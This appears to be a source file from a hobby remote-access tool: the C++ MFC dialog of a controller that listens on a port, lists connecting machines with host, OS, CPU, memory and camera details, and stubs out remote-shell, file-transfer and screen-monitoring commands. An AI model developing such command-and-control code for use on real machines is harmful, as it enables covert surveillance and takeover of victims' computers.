
// MFCApplication4Dlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "MFCApplication4.h"
#include "MFCApplication4Dlg.h"
#include "afxdialogex.h"
#include "RemoteShell.h"
#include "resource.h"

#include "Misc.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif




#define DEFAULT_ADDRESS (L"0.0.0.0")
#define DEFAULT_PORT (L"5555")




// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMFCApplication4Dlg 对话框



CMFCApplication4Dlg::CMFCApplication4Dlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_MFCAPPLICATION4_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMFCApplication4Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST2, m_ListCtrl);
	DDX_Control(pDX, IDC_EDIT1, m_EditIpAddress);
	DDX_Control(pDX, IDC_EDIT2, m_EditPort);
	DDX_Control(pDX, IDC_BUTTON1, m_ButtonStartSocketServer);
	DDX_Control(pDX, IDC_BUTTON2, m_ButtonStopSocketServer);
}

BEGIN_MESSAGE_MAP(CMFCApplication4Dlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &CMFCApplication4Dlg::OnBnClickedOk)
	ON_BN_CLICKED(IDCANCEL, &CMFCApplication4Dlg::OnBnClickedCancel)
	ON_NOTIFY(LVN_ITEMCHANGED, IDC_LIST2, &CMFCApplication4Dlg::OnLvnItemchangedList2)
	ON_EN_CHANGE(IDC_EDIT1, &CMFCApplication4Dlg::OnEnChangeEdit1)
	ON_BN_CLICKED(IDC_BUTTON1, &CMFCApplication4Dlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CMFCApplication4Dlg::OnBnClickedButton2)

	ON_MESSAGE(WM_RECV_LOGIN_PACKET, OnRecvLoginPacket)
	ON_MESSAGE(WM_CLIENT_DISCONNECT, OnClientDisconnect)
END_MESSAGE_MAP()


// CMFCApplication4Dlg 消息处理程序

BOOL CMFCApplication4Dlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	// 以下是List Control
	//标题所需字段
	CString head[] = { TEXT("ConnectId"),TEXT("IP"), TEXT("端口"), TEXT("计算机名"), TEXT("操作系统"), TEXT("CPU"), TEXT("内存"), TEXT("摄像头")};

	//插入列标题
	m_ListCtrl.InsertColumn(0, head[0], LVCFMT_LEFT, 10);			// ConnectId仅用于标识，长度设为0，不在图像界面的列表中显示
	m_ListCtrl.InsertColumn(1, head[1], LVCFMT_LEFT, 110);
	m_ListCtrl.InsertColumn(2, head[2], LVCFMT_LEFT, 50);
	m_ListCtrl.InsertColumn(3, head[3], LVCFMT_LEFT, 150);
	m_ListCtrl.InsertColumn(4, head[4], LVCFMT_LEFT, 150);
	m_ListCtrl.InsertColumn(5, head[5], LVCFMT_LEFT, 350);
	m_ListCtrl.InsertColumn(6, head[6], LVCFMT_LEFT, 150);
	m_ListCtrl.InsertColumn(7, head[7], LVCFMT_LEFT, 60);

	//设置风格样式
	//LVS_EX_GRIDLINES 网格
	//LVS_EX_FULLROWSELECT 选中整行
	m_ListCtrl.SetExtendedStyle(m_ListCtrl.GetExtendedStyle()
		| LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);
	// 以上是List Control


	// 以下是文本框的初始化内容
	m_EditIpAddress.SetWindowText(DEFAULT_ADDRESS);
	m_EditPort.SetWindowText(DEFAULT_PORT);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMFCApplication4Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMFCApplication4Dlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMFCApplication4Dlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


// 按下远程Shell按钮
void CMFCApplication4Dlg::OnBnClickedOk()
{
	RemoteShell *dlg = new RemoteShell();
	dlg->Create(IDD_DIALOG1, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
}


// 按下取消按钮
void CMFCApplication4Dlg::OnBnClickedCancel()
{
	//m_Server.StopSocketServer();
}




void CMFCApplication4Dlg::OnLvnItemchangedList2(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
}


void CMFCApplication4Dlg::OnEnChangeEdit1()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
}


// 开始监听按钮
void CMFCApplication4Dlg::OnBnClickedButton1()
{
	CString csIpAddress;
	m_EditIpAddress.GetWindowText(csIpAddress);
	LPCTSTR lpszIpAddress = csIpAddress.AllocSysString();
	
	CString csPort;
	m_EditPort.GetWindowText(csPort);
	USHORT wPort = _ttoi(csPort);

	if (!theApp.m_Server.IsRunning()) {
		BOOL bRet = theApp.m_Server.StartSocketServer(ManageRecvPacket, lpszIpAddress, wPort);
		if (!bRet) {
			MessageBox(L"启动SocketServer失败");
		}
		else {
			m_ButtonStartSocketServer.EnableWindow(false);		// 按钮变灰
		}
	}
	//else {
	//	MessageBox(L"SocketServer已启动，请先关闭监听，再开始监听");
	//}
}


// 关闭监听
void CMFCApplication4Dlg::OnBnClickedButton2()
{
	if (theApp.m_Server.IsRunning()) {
		BOOL bRet = theApp.m_Server.StopSocketServer();
		if (!bRet) {
			MessageBox(L"关闭SocketServer失败");
		}
		else {
			m_ButtonStartSocketServer.EnableWindow(true);
		}
	}
}




// 接收到上线包后触发的消息处理函数
// 封包的有效性由触发点处的代码判断，能传进来的就是有效的
afx_msg LRESULT CMFCApplication4Dlg::OnRecvLoginPacket(WPARAM wParam, LPARAM lParam) {

	CPacket* pPacket = (CPacket*)lParam;
	LOGIN_INFO LoginInfo(pPacket->m_pbPacketBody);

	CHAR szConnectId[15];
	_itoa_s(pPacket->m_pClient->m_dwConnectId, szConnectId, 15);	// 从数字转成CHAR字符串

	CHAR szPort[10];
	_itoa_s(pPacket->m_pClient->m_wPort, szPort, 10);

	USES_CONVERSION;				// 使用A2W之前先声明这个


	DWORD dwInsertIndex = m_ListCtrl.GetItemCount();	// 插入到列表尾部

	LV_ITEM   lvitemData = {0};
	lvitemData.mask = LVIF_PARAM;
	lvitemData.iItem = dwInsertIndex;
	lvitemData.lParam = (LPARAM)(pPacket->m_pClient);	// 额外的信息，这里用于保存本行对应的pClient

	m_ListCtrl.InsertItem(&lvitemData);
	//m_ListCtrl.InsertItem(0, A2W(szConnectId));								// 第一列，ID。第一个参数0是指在第0行处插入这一行
	m_ListCtrl.SetItemText(dwInsertIndex, 1, pPacket->m_pClient->m_lpszIpAddress);		// IP
	m_ListCtrl.SetItemText(dwInsertIndex, 2, A2W(szPort));								// 端口
	m_ListCtrl.SetItemText(dwInsertIndex, 3, A2W(LoginInfo.szHostName));				// 计算机名
	m_ListCtrl.SetItemText(dwInsertIndex, 4, A2W(LoginInfo.szOsVersion));				// 操作系统
	m_ListCtrl.SetItemText(dwInsertIndex, 5, A2W(LoginInfo.szCpuType));					// CPU
	m_ListCtrl.SetItemText(dwInsertIndex, 6, A2W(LoginInfo.szMemoryInfo));				// 内存
	m_ListCtrl.SetItemText(dwInsertIndex, 7, A2W(LoginInfo.bHaveCamera ? "有" : "无"));	// 摄像头

	delete pPacket;			// 用完了一定要释放啊
	return 0;
}


// 与客户端的连接中断
afx_msg LRESULT CMFCApplication4Dlg::OnClientDisconnect(WPARAM wParam, LPARAM lParam) {

	CONNID dwConnectId = (CONNID)wParam;

	

	CHAR szConnectId[15];
	//USES_CONVERSION;
	//_itoa_s(wConnectId, szConnectId, 15);	// 从数字转成CHAR字符串
	//m_ListCtrl.DeleteItem(A2W(szConnectId));
	//for (int i = 0; i < nCol; i++)
	//{
	//	m_ListCtrl.DeleteColumn(0);
	//}


	CClient* pClient = NULL;
	DWORD dwIndex;

	for (dwIndex = 0; dwIndex < m_ListCtrl.GetItemCount(); dwIndex++) {
		// 获取所枚举的这一行的额外信息，pClient
		LV_ITEM  lvitemData = { 0 };
		lvitemData.mask = LVIF_PARAM;
		lvitemData.iItem = dwIndex;
		m_ListCtrl.GetItem(&lvitemData);
		pClient = (CClient*)lvitemData.lParam;

		// 确定要删除的那行的索引，并删除这一行
		if (dwConnectId == pClient->m_dwConnectId) {
			m_ListCtrl.DeleteItem(dwIndex);
			MessageBox(L"下线！");
			break;
		}
	}

	if (pClient != NULL) {		// 这里必须不为NULL，如果这里为NULL，说明我程序一定有逻辑问题。
		theApp.m_Server.m_ClientManage.DeleteClientFromList(pClient);		// 在这个函数里delete pClient
	}
	
	return 0;
}




// 接收到有效封包时回调此函数
void CALLBACK CMFCApplication4Dlg::ManageRecvPacket(CPacket *pPacket) {
	printf("回调\n");

	switch (pPacket->m_pClient->m_dwClientStatus) {			// 客户端的不同状态

	case WAIT_FOR_LOGIN:									// 服务端已经接收了客户端发来的密钥了，等待上线包
			
		// 这个阶段，只要不是上线包，通通丢弃。
		if (pPacket->m_PacketHead.wCommandId == LOGIN && pPacket->m_dwPacketBodyLength == LOGIN_PACKET_BODY_LENGTH) {
			theApp.m_pMainWnd->PostMessage(WM_RECV_LOGIN_PACKET, 0, (LPARAM)pPacket);
			pPacket->m_pClient->m_dwClientStatus = LOGINED;
		}

	case LOGINED:											// 接收上线包后，状态变为已登录。开始正常通信。
		
		switch (pPacket->m_PacketHead.wCommandId) {

		// 远程SHELL
		case SHELL_REMOTE:
			;

		// 文件管理
		case FILE_TRANSFOR:
			;

		// 屏幕监控
		case SCREEN_MONITOR:
			;
		}
	}

}